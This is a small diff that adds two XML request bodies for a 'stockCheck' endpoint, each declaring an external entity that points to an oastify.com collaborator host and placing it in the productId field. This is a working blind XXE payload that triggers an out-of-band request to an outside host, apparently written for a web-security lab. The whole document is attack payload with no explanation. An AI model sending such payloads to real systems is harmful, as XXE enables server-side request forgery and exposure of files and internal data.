@@ -1,0 +1,8 @@
+
+
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://f8ozt1dzn6ekagm5ut07bopxjopfd51u.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://f8ozt1dzn6ekagm5ut07bopxjopfd51u.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
